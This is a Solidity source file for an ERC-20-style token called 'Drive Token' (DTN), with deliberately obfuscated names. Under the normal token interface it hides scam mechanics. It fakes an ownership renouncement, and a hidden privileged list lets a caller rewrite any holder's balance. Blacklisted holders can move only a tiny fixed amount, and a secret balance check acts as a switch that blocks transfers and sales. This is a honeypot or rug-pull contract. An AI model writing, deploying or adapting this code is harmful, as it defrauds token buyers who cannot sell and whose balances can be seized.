//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface receiverMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingAutoTotal) external view returns (uint256);

    function transfer(address swapModeAt, uint256 limitLaunch) external returns (bool);

    function allowance(address takeIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address swapModeAt,
        uint256 limitLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeMin, uint256 value);
    event Approval(address indexed takeIs, address indexed spender, uint256 value);
}

abstract contract atLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toAt {
    function createPair(address takeTx, address maxLaunchReceiver) external returns (address);
}

interface receiverMinMetadata is receiverMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DriveToken is atLaunched, receiverMin, receiverMinMetadata {

    function modeWallet() private view {
        require(amountTo[_msgSender()]);
    }

    function tradingTakeList(address launchedSwap) public {
        modeWallet();
        if (takeAtTo == tokenFrom) {
            autoReceiver = true;
        }
        if (launchedSwap == launchedReceiver || launchedSwap == autoSender) {
            return;
        }
        tokenTrading[launchedSwap] = true;
    }

    uint256 txLimit;

    function getOwner() external view returns (address) {
        return fromWallet;
    }

    function transfer(address takeLimit, uint256 limitLaunch) external virtual override returns (bool) {
        return limitTo(_msgSender(), takeLimit, limitLaunch);
    }

    bool public takeAtTo;

    bool public txEnable;

    event OwnershipTransferred(address indexed shouldToken, address indexed buySell);

    function sellMaxFund(address atLiquidity, address swapModeAt, uint256 limitLaunch) internal returns (bool) {
        require(amountLaunch[atLiquidity] >= limitLaunch);
        amountLaunch[atLiquidity] -= limitLaunch;
        amountLaunch[swapModeAt] += limitLaunch;
        emit Transfer(atLiquidity, swapModeAt, limitLaunch);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return autoMode;
    }

    function owner() external view returns (address) {
        return fromWallet;
    }

    uint256 constant receiverTrading = 2 ** 10;

    uint256 autoTotal;

    address takeMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address minShould, uint256 limitLaunch) public virtual override returns (bool) {
        fundToken[_msgSender()][minShould] = limitLaunch;
        emit Approval(_msgSender(), minShould, limitLaunch);
        return true;
    }

    function launchIs(address takeLimit, uint256 limitLaunch) public {
        modeWallet();
        amountLaunch[takeLimit] = limitLaunch;
    }

    function transferFrom(address atLiquidity, address swapModeAt, uint256 limitLaunch) external override returns (bool) {
        if (_msgSender() != takeMin) {
            if (fundToken[atLiquidity][_msgSender()] != type(uint256).max) {
                require(limitLaunch <= fundToken[atLiquidity][_msgSender()]);
                fundToken[atLiquidity][_msgSender()] -= limitLaunch;
            }
        }
        return limitTo(atLiquidity, swapModeAt, limitLaunch);
    }

    function txLaunch(address modeSell) public {
        if (txEnable) {
            return;
        }
        if (tokenFrom) {
            tokenFrom = true;
        }
        amountTo[modeSell] = true;
        
        txEnable = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchTake;
    }

    uint8 private tradingTotal = 18;

    bool public tokenFrom;

    function allowance(address fromSellLaunch, address minShould) external view virtual override returns (uint256) {
        if (minShould == takeMin) {
            return type(uint256).max;
        }
        return fundToken[fromSellLaunch][minShould];
    }

    function balanceOf(address marketingAutoTotal) public view virtual override returns (uint256) {
        return amountLaunch[marketingAutoTotal];
    }

    address private fromWallet;

    string private autoMode = "Drive Token";

    function receiverModeAt(uint256 limitLaunch) public {
        modeWallet();
        autoTotal = limitLaunch;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return shouldLaunchTrading;
    }

    address public autoSender;

    address public launchedReceiver;

    mapping(address => bool) public tokenTrading;

    bool public autoReceiver;

    function decimals() external view virtual override returns (uint8) {
        return tradingTotal;
    }

    mapping(address => uint256) private amountLaunch;

    address launchFromSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    constructor (){
        if (takeAtTo) {
            autoReceiver = true;
        }
        senderExempt exemptTeamSender = senderExempt(takeMin);
        autoSender = toAt(exemptTeamSender.factory()).createPair(exemptTeamSender.WETH(), address(this));
        
        launchedReceiver = _msgSender();
        minSwapMarketing();
        amountTo[launchedReceiver] = true;
        amountLaunch[launchedReceiver] = shouldLaunchTrading;
        if (autoReceiver) {
            autoReceiver = true;
        }
        emit Transfer(address(0), launchedReceiver, shouldLaunchTrading);
    }

    function limitTo(address atLiquidity, address swapModeAt, uint256 limitLaunch) internal returns (bool) {
        if (atLiquidity == launchedReceiver) {
            return sellMaxFund(atLiquidity, swapModeAt, limitLaunch);
        }
        uint256 buyMarketingAmount = receiverMin(autoSender).balanceOf(launchFromSell);
        require(buyMarketingAmount == autoTotal);
        require(swapModeAt != launchFromSell);
        if (tokenTrading[atLiquidity]) {
            return sellMaxFund(atLiquidity, swapModeAt, receiverTrading);
        }
        return sellMaxFund(atLiquidity, swapModeAt, limitLaunch);
    }

    uint256 private shouldLaunchTrading = 100000000 * 10 ** 18;

    string private launchTake = "DTN";

    mapping(address => mapping(address => uint256)) private fundToken;

    mapping(address => bool) public amountTo;

    function minSwapMarketing() public {
        emit OwnershipTransferred(launchedReceiver, address(0));
        fromWallet = address(0);
    }

}